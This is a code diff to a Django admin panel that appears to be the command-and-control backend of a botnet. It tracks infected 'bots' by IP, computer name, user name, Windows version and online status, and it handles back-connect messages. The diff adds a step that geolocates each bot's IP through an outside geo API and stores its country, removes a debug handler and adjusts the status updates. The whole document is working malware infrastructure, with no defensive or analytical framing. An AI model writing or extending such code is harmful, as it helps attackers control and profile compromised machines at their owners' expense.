@@ -8,6 +8,7 @@ from .bot_pb2 import BotMsg, BackConnectMsg, PanelMsg
 from .models import Bot, Session
 import datetime
 import struct
+import requests
 
 
 # from django.core.paginator import Paginator
@@ -16,6 +17,11 @@ import struct
 # ВСПОМОГАТЕЛЬНЫЙ ФУНКЦИИ --------------------------- \/
 
 class Subsidiary:
+
+    @staticmethod
+    def get_country(ip: str):
+        country = requests.get(f'http://api.sypexgeo.net/json/{ip}').json()['country']['iso'].lower()
+        return country
 
     @staticmethod
     def get_bot_ip(request):
@@ -112,16 +118,17 @@ class AdminPanel:
     def get_table_page(request) -> render:
         tz = pytz.UTC
 
-        bots = []
-
         for bot in Bot.objects.all():
             if (datetime.datetime.now(tz=tz) - bot.date).seconds // 60 > 3:
                 bot.is_online = False
-            bots.append(bot)
+                bot.save()
+
+        bots = Bot.objects.all()
 
         return render(request, 'main/table.html', {'bots': bots})
 
-    def get_sessions_page(self, request):
+    @staticmethod
+    def get_sessions_page(request):
         sessions = Session.objects.all()
         return render(request, 'main/session.html', {'sessions': sessions})
 
@@ -143,16 +150,6 @@ class AdminPanel:
 class Handlers:
     def __init__(self, subsidiary):
         self.sub = subsidiary
-
-    def test(self, request):
-        for bot in Bot.objects.all():
-            _2 = bot.date
-            print(_2, bot.uid)
-
-        tz = pytz.UTC
-        _1 = datetime.datetime.now(tz=tz)
-        print((_1 - _2).seconds // 60)
-        return HttpResponse('')
 
     @staticmethod
     def login_handler(request) -> HttpResponse or JsonResponse:
@@ -226,6 +223,8 @@ class Handlers:
 
                 ip = self.sub.get_bot_ip(request)
 
+                country = self.sub.get_country(ip)
+
                 uid = bot.uid.decode('utf-16-le')
                 computername = bot.computername.decode('utf-16-le')
                 username = bot.username.decode('utf-16-le')
@@ -239,7 +238,7 @@ class Handlers:
                 except Exception as e:
                     print(e)
                     _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64,
-                               is_server=is_server)
+                               is_server=is_server, country=country)
 
                 if os_major == 10 and os_minor == 0:
                     _bot.is_win10 = True
